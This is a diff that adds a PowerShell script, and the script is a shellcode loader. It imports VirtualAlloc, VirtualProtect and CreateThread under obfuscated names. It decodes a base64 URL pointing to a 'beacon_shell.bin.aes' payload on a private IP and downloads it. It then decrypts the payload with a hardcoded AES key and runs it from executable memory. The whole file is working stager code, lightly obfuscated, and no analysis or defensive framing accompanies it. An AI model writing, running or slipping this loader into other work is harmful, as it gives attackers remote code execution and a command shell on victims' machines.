@@ -1,0 +1,55 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class X_xx1 {
+    [DllImport("kernel32", EntryPoint = "VirtualAlloc")]
+    public static extern IntPtr A(IntPtr a, uint b, uint c, uint d);
+
+    [DllImport("kernel32", EntryPoint = "VirtualProtect")]
+    public static extern bool B(IntPtr x, UIntPtr y, uint z, out uint o);
+
+    [DllImport("kernel32", EntryPoint = "CreateThread")]
+    public static extern IntPtr C(IntPtr t1, uint t2, IntPtr t3, IntPtr t4, uint t5, out uint t6);
+}
+"@
+
+# Base64-encoded URL, AES Key, and IV
+$u = "aHR0cDovLzE5Mi4xNjguNTIuMTM2OjgwODEvYmVhY29uX3NoZWxsLmJpbi5hZXM="  # URL
+$k = "U2l4dGVlbkJ5dGVLZXkhIQ=="  # SixteenByteKey!!
+$v = "VGhpc0lzQW5JVjQ1Njc4OQ=="  # ThisIsAnIV456789
+
+# Decode base64 values
+$U = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u))
+$K = [Convert]::FromBase64String($k)
+$I = [Convert]::FromBase64String($v)
+
+# Download encrypted AES binary
+$W = New-Object Net.WebClient
+$D = $W.DownloadData($U)
+
+# Decrypt AES
+$M = New-Object IO.MemoryStream
+$M.Write($D, 0, $D.Length)
+$M.Position = 0
+
+$A = New-Object Security.Cryptography.RijndaelManaged
+$A.Mode = "CBC"
+$A.Padding = "PKCS7"
+$C = $A.CreateDecryptor($K, $I)
+$S = New-Object Security.Cryptography.CryptoStream($M, $C, "Read")
+
+$B = New-Object byte[] $D.Length
+$L = $S.Read($B, 0, $B.Length)
+if ($L -eq 0) { exit }
+
+# Allocate, copy, run shellcode
+$P = [X_xx1]::A(0, $L, 0x1000, 0x40)
+[Runtime.InteropServices.Marshal]::Copy($B, 0, $P, $L)
+
+$O = 0
+$Z = [UIntPtr]::op_Explicit($L)
+[X_xx1]::B($P, $Z, 0x40, [ref]$O) | Out-Null
+
+$T = 0
+[X_xx1]::C(0, 0, $P, 0, 0, [ref]$T)
